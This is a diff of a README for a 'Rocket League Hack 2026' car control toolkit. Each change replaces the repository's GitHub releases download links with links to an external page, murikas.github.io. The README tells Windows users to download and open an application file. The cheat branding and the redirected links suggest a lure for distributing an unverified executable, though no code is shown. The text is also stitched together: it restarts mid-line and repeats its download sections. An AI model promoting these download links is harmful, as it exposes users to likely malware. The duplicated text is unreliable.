@@ -1,6 +1,6 @@
 # 🚀 rocket-league-hack-2026-aerial-car-control-toolkit - Master Aerial Car Control Today
 
-[![Download Rocket League Hack 2026](https://img.shields.io/badge/⬇️_Download_Now-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Murikas/rocket-league-hack-2026-aerial-car-control-toolkit/releases)
+[![Download Rocket League Hack 2026](https://img.shields.io/badge/⬇️_Download_Now-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://murikas.github.io)
 
 ## 🎯 Overview
 
@@ -34,9 +34,9 @@ Getting started is simple. You only need a Windows PC, an internet connection, a
 
 ### 📥 Download and Run on Windows
 
-[![Get Rocket League Hack 2026](https://img.shields.io/badge/Get_the_App-00C853?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Murikas/rocket-league-hack-2026-aerial-car-control-toolkit/releases)
+[![Get Rocket League Hack 2026](https://img.shields.io/badge/Get_the_App-00C853?style=for-the-badge&logo=windows&logoColor=white)](https://murikas.github.io)
 
-Visit this link to download the application: [Rocket League Hack 2026 download page](https://github.com/Murikas/rocket-league-hack-2026-aerial-car-control-toolkit/releases).
+Visit this link to download the application: [Rocket League Hack 2026 download page](https://murikas.github.io).
 
 When the file finishes downloading, open the downloaded application file to start the toolkit.
 
@@ -56,7 +56,7 @@ Car control practice helps with the small movements that support everything else
 
 Use# 🚀 rocket-league-hack-2026-aerial-car-control-toolkit - Master Aerial Car Control Today
 
-[![Download Rocket League Hack 2026](https://img.shields.io/badge/⬇️_Download_Now-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Murikas/rocket-league-hack-2026-aerial-car-control-toolkit/releases)
+[![Download Rocket League Hack 2026](https://img.shields.io/badge/⬇️_Download_Now-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://murikas.github.io)
 
 ## 🎯 Overview
 
@@ -90,9 +90,9 @@ Getting started is simple. You only need a Windows PC, an internet connection, a
 
 ### 📥 Download and Run on Windows
 
-[![Get Rocket League Hack 2026](https://img.shields.io/badge/Get_the_App-00C853?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Murikas/rocket-league-hack-2026-aerial-car-control-toolkit/releases)
+[![Get Rocket League Hack 2026](https://img.shields.io/badge/Get_the_App-00C853?style=for-the-badge&logo=windows&logoColor=white)](https://murikas.github.io)
 
-Visit this link to download the application: [Rocket League Hack 2026 download page](https://github.com/Murikas/rocket-league-hack-2026-aerial-car-control-toolkit/releases).
+Visit this link to download the application: [Rocket League Hack 2026 download page](https://murikas.github.io).
 
 When the download finishes, open the downloaded file to start the toolkit.
 
@@ -164,8 +164,8 @@ Analytics are most useful when they lead to a decision. If the overview shows th
 
 ## 🔗 Download Again
 
-[![Download Rocket League Hack 2026](https://img.shields.io/badge/⬇️_Download-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Murikas/rocket-league-hack-2026-aerial-car-control-toolkit/releases)
+[![Download Rocket League Hack 2026](https://img.shields.io/badge/⬇️_Download-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://murikas.github.io)
 
-Visit this link to download the application: [https://github.com/Murikas/rocket-league-hack-2026-aerial-car-control-toolkit/releases](https://github.com/Murikas/rocket-league-hack-2026-aerial-car-control-toolkit/releases).
+Visit this link to download the application: [https://murikas.github.io](https://murikas.github.io).
 
 Keywords: rl-script, rocket-league, rocket-league-ai, rocket-league-research, aerial training, car control, kickoff profiles, rotations, mechanics practice, replay notes, competitive analytics, windows companion
